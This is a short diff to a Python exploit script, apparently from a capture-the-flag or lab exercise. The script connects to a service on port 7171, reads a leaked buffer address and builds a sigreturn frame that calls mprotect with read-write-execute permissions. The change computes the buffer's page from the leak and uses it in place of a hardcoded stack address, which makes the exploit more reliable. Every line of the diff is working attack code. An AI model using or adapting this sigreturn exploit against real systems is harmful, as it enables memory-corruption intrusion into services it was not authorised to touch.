@@ -20,6 +20,8 @@ JUST_EXIT     = 0x0805477b
 SYS_MPROTECT  = 125
 SYS_SIGRETURN = 119
 
+PAGE_SIZE = 4096
+
 def recv_n_bytes(sock, n):
     c = 0
     data = ''
@@ -31,6 +33,7 @@ def recv_n_bytes(sock, n):
 s = create_connection((ip, 7171))
 buffer_address = recv_n_bytes(s, 4)
 buffer_address = struct.unpack("<I", buffer_address)[0]
+buffer_page    = buffer_address & ~(PAGE_SIZE - 1)
 print "[+] Buffer address is", hex(buffer_address)
 
 page = recv_n_bytes(s, 4)
@@ -43,7 +46,7 @@ frame = SigreturnFrame(INT_80, arch="x86")
 
 # Frame that tries to call mprotect
 frame.set_regvalue("eax", SYS_MPROTECT)
-frame.set_regvalue("ebx", 0xbffff000)
+frame.set_regvalue("ebx", buffer_page)
 frame.set_regvalue("ecx", 0x10000)
 frame.set_regvalue("edx", 0x7)
 frame.set_regvalue("ebp", 0xbffdf000)
